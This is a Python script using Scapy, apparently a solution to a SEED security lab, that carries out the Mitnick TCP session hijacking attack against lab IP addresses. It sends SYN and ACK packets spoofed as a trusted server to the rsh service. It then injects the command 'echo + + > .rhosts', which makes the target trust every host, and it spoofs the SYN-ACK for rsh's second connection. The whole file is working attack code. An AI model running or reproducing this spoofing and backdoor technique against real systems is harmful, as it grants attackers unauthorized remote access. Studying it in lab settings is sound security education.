#!usr/bin/python3
from scapy.all import *
import sys
import time

X_ip = "10.9.0.5"
x_port = 514
x_port2 = 1023

srv_ip = "10.9.0.6"
srv_port = 1023
srv_port2 = 9090

def spoof_pkt(pkt):
    sequence = 778933536 + 1
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    tcp_len = old_ip.len - old_ip.ihl * 4 - old_tcp.dataofs * 4
    print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))

    if old_tcp.flags == "SA":
        print("Sending spoofed ACK packet...")
        IPLayer = IP(src=srv_ip, dst=X_ip)
        TCPlayer = TCP(sport=srv_port, dport=x_port, flags="A", seq=sequence, ack=old_tcp.seq + 1)
        pkt = IPLayer / TCPlayer
        send(pkt, verbose=0)

        #After sending the spoofed ACK packet, the script sends a spoofed RSH Data packet to the X-terminal.
        print("Sending spoofed RSH Data packet...")
        data = "9090\x00seed\x00seed\x00echo + + > .rhosts\x00"
        pkt = IPLayer / TCPlayer / data
        send(pkt, verbose=0)

    if old_tcp.flags == "S" and old_tcp.dport == srv_port2 and old_ip.dst == srv_ip:
        sequence_num = 3780933595
        print("Sending spoofed SYN-ACK packet for 2nd connection...")
        IPLayer = IP(src=srv_ip, dst=X_ip)
        TCPlayer = TCP(sport=srv_port2, dport=x_port2, flags="SA", seq=sequence_num, ack=old_tcp.seq + 1)
        pkt = IPLayer / TCPlayer
        send(pkt, verbose=0)

def spoofing_SYN():
    print("Sending spoofed SYN packet...")
    IPLayer = IP(src=srv_ip, dst=X_ip)
    TCPlayer = TCP(sport=srv_port, dport=x_port, flags="S", seq=778933536)
    pkt = IPLayer / TCPlayer
    send(pkt, verbose=0)

def main():
    spoofing_SYN()
    time.sleep(5)
    pkt = sniff(filter="tcp and host 10.9.0.5", prn=spoof_pkt)

main()